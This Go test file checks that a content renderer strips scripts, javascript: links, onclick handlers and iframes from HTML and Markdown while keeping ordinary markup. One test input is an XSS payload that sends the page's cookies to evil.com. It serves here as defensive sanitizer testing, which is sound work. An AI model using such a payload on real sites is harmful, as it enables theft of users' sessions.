package content

import (
	"strings"
	"testing"
)

func TestSanitize(t *testing.T) {
	in := `<pre><code><script>document.location='http://evil.com/?c='+document.cookie</script></code></pre>`
	out := Render("html", in)
	if strings.Contains(out, "<script") {
		t.Fatalf("live <script> survived: %s", out)
	}
	if !strings.Contains(out, "&lt;script") {
		t.Fatalf("payload not shown as text: %s", out)
	}
	out2 := Render("html", `<a href="javascript:alert(1)">x</a><b onclick="evil()">y</b>`)
	if strings.Contains(strings.ToLower(out2), "javascript:") || strings.Contains(strings.ToLower(out2), "onclick=") {
		t.Fatalf("active attrs survived: %s", out2)
	}
	out3 := Render("html", `<h1>Title</h1><pre><code>ls -la</code></pre>`)
	if !strings.Contains(out3, "<h1>Title</h1>") || !strings.Contains(out3, "ls -la") {
		t.Fatalf("legit HTML broken: %s", out3)
	}
}

func TestRenderMarkdown(t *testing.T) {
	out := Render("md", "# Hi\n\n<iframe src=x></iframe>\n\n```bash\nls\n```")
	if !strings.Contains(out, "<h1") || strings.Contains(out, "<iframe") || !strings.Contains(out, "ls") {
		t.Fatalf("markdown render: %s", out)
	}
}
